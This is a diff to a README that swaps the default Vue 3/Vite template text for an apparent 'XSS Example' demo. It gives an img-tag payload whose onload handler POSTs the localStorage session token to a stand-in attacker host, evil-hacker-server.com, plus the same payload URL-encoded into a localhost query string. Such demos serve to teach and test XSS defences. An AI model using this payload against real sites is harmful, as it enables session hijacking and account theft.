@@ -1,18 +1,15 @@
-# Vue 3 + TypeScript + Vite
+# XSS Example
 
-This template should help get you started developing with Vue 3 and TypeScript in Vite. The template uses Vue 3 `<script setup>` SFCs, check out the [script setup docs](https://v3.vuejs.org/api/sfc-script-setup.html#sfc-script-setup) to learn more.
+## Payload
 
-## Recommended IDE Setup
+```
+<img
+src="https://i.ytimg.com/vi/5j2LOZH9_oM/maxresdefault.jpg"
+style="display: none"
+onload="fetch('https:\/\/evil-hacker-server.com', {method: 'POST', body: localStorage.getItem('sessionToken')})"
+/>
+```
 
-- [VS Code](https://code.visualstudio.com/) + [Volar](https://marketplace.visualstudio.com/items?itemName=Vue.volar) (and disable Vetur) + [TypeScript Vue Plugin (Volar)](https://marketplace.visualstudio.com/items?itemName=Vue.vscode-typescript-vue-plugin).
+## Full URL with payload URL encoded:
 
-## Type Support For `.vue` Imports in TS
-
-TypeScript cannot handle type information for `.vue` imports by default, so we replace the `tsc` CLI with `vue-tsc` for type checking. In editors, we need [TypeScript Vue Plugin (Volar)](https://marketplace.visualstudio.com/items?itemName=Vue.vscode-typescript-vue-plugin) to make the TypeScript language service aware of `.vue` types.
-
-If the standalone TypeScript plugin doesn't feel fast enough to you, Volar has also implemented a [Take Over Mode](https://github.com/johnsoncodehk/volar/discussions/471#discussioncomment-1361669) that is more performant. You can enable it by the following steps:
-
-1. Disable the built-in TypeScript Extension
-   1. Run `Extensions: Show Built-in Extensions` from VSCode's command palette
-   2. Find `TypeScript and JavaScript Language Features`, right click and select `Disable (Workspace)`
-2. Reload the VSCode window by running `Developer: Reload Window` from the command palette.
+http://localhost:5173/#/home?html=%3Cimg%0Asrc%3D%22https%3A%2F%2Fi.ytimg.com%2Fvi%2F5j2LOZH9_oM%2Fmaxresdefault.jpg%22%0Astyle%3D%22display%3A%20none%22%0Aonload%3D%22fetch%28%27https%3A%5C%2F%5C%2Fevil-hacker-server.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20body%3A%20localStorage.getItem%28%27sessionToken%27%29%7D%29%22%0A%2F%3E
